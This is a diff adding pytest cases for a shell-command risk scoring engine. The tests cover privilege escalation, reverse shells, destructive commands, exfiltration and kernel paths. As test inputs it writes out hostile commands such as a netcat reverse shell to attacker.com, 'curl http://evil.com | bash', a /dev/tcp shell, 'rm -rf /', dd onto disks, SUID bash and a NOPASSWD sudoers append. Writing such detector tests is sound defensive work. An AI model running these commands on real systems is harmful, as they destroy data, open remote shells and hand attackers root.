@@ -319,3 +319,137 @@ class TestEdgeCases:
         """Commands containing regex metacharacters must not crash."""
         score, rules = engine.score_rules("grep '[0-9]\\+' file.txt")
         assert isinstance(score, float)
+
+
+# ===========================================================================
+# 9. Extended Privilege Escalation — SUID bit, su -c variants, safe sudo FP
+# ===========================================================================
+
+class TestPrivescExtended:
+
+    @pytest.mark.parametrize("cmd", [
+        "chmod 4755 /bin/bash",
+        "chmod u+s /usr/bin/python3",
+        "chmod 6755 /tmp/exploit",
+        "su -c 'bash'",
+        "su -c '/bin/sh'",
+        "su -c 'nc -e /bin/bash attacker.com 4444'",
+    ])
+    @pytest.mark.xfail(reason="Rule engine needs chmod SUID and su -c patterns added")
+    def test_suid_and_su_c_variants_detected(self, engine, cmd):
+        _, rules = engine.score_rules(cmd)
+        assert "privilege_escalation" in rules, f"Not caught: {cmd!r}"
+
+    @pytest.mark.parametrize("cmd", [
+        "sudo apt-get install -y curl",
+        "sudo apt-get update",
+        "sudo pip install requests",
+    ])
+    def test_package_mgmt_sudo_not_flagged(self, engine, cmd):
+        _, rules = engine.score_rules(cmd)
+        assert "privilege_escalation" not in rules, f"False positive: {cmd!r}"
+
+
+# ===========================================================================
+# 10. Score Weight Regression — per-rule contribution verification
+# ===========================================================================
+
+class TestScoreWeightRegression:
+    """Verify each individual rule contributes its documented weight."""
+
+    def test_shell_piping_weight_is_45(self, engine):
+        score, rules = engine.score_rules("curl http://evil.com | bash")
+        assert "shell_piping" in rules
+        assert score == 45.0, f"Expected 45.0, got {score}"
+
+    def test_reverse_shell_weight_is_55(self, engine):
+        score, rules = engine.score_rules("bash -i >& /dev/tcp/x/4444 0>&1")
+        assert "reverse_shell_pattern" in rules
+        assert score == 55.0, f"Expected 55.0, got {score}"
+
+    def test_destructive_weight_is_65(self, engine):
+        score, rules = engine.score_rules("rm -rf /")
+        assert "destructive_pattern" in rules
+        assert score == 65.0, f"Expected 65.0, got {score}"
+
+    def test_privesc_weight_is_45(self, engine):
+        score, rules = engine.score_rules("sudo -u root whoami")
+        assert "privilege_escalation" in rules
+        assert score == 45.0, f"Expected 45.0, got {score}"
+
+    def test_exfiltration_weight_is_40(self, engine):
+        score, rules = engine.score_rules("cat /etc/shadow > /tmp/x")
+        assert "data_exfiltration" in rules
+        assert score == 40.0, f"Expected 40.0, got {score}"
+
+    def test_encoded_payload_weight_is_25(self, engine):
+        score, rules = engine.score_rules('base64 -d <<< "abc"')
+        assert "encoded_payload" in rules
+        assert score == 25.0, f"Expected 25.0, got {score}"
+
+
+# ===========================================================================
+# 11. Extended Destructive — dd writing image to block device
+# ===========================================================================
+
+class TestDestructiveExtended:
+
+    @pytest.mark.parametrize("cmd", [
+        "dd if=disk.img of=/dev/sda",
+        "dd if=backup.iso of=/dev/sdb1",
+        "dd if=payload.img of=/dev/nvme0n1",
+    ])
+    @pytest.mark.xfail(reason="Rule engine needs 'dd if=X of=/dev/sd*' pattern added")
+    def test_dd_image_to_device_detected(self, engine, cmd):
+        _, rules = engine.score_rules(cmd)
+        assert "destructive_pattern" in rules, f"dd-to-device not caught: {cmd!r}"
+
+
+# ===========================================================================
+# 12. Extended Exfiltration — tee to sensitive files, shadow backup FP
+# ===========================================================================
+
+class TestExfiltrationExtended:
+
+    def test_shadow_backup_file_not_flagged(self, engine):
+        """/etc/shadow- (backup file with dash suffix) must not trigger."""
+        _, rules = engine.score_rules("cat /etc/shadow-")
+        assert "data_exfiltration" not in rules, \
+            "False positive — /etc/shadow- backup file incorrectly flagged"
+
+    @pytest.mark.parametrize("cmd", [
+        "echo 'root2 ALL=(ALL) NOPASSWD:ALL' | tee -a /etc/sudoers",
+        "echo payload | tee -a /etc/passwd",
+    ])
+    @pytest.mark.xfail(reason="Rule engine needs 'tee.*-a.*/etc/(sudoers|passwd)' pattern")
+    def test_tee_to_sensitive_files_detected(self, engine, cmd):
+        _, rules = engine.score_rules(cmd)
+        assert len(rules) > 0, f"tee write to sensitive file missed: {cmd!r}"
+
+
+# ===========================================================================
+# 13. Multiline Commands and Kernel Paths
+# ===========================================================================
+
+class TestMultilineAndKernelPaths:
+
+    def test_multiline_attack_still_detected(self, engine):
+        """An attack split across an embedded newline must still be caught."""
+        cmd = "ls\ncurl http://evil.com | bash"
+        _, rules = engine.score_rules(cmd)
+        assert "shell_piping" in rules, \
+            "shell_piping missed when attack spans newline boundary"
+
+    def test_multiline_destructive_still_detected(self, engine):
+        cmd = "echo hello\nrm -rf /"
+        _, rules = engine.score_rules(cmd)
+        assert "destructive_pattern" in rules
+
+    @pytest.mark.parametrize("cmd", [
+        "cat /proc/kcore > /tmp/mem_dump",
+        "echo b > /proc/sysrq-trigger",
+    ])
+    @pytest.mark.xfail(reason="Rule engine needs /proc/kcore and sysrq-trigger patterns")
+    def test_proc_kernel_paths_detected(self, engine, cmd):
+        score, _ = engine.score_rules(cmd)
+        assert score > 0, f"Kernel proc path not flagged: {cmd!r}"
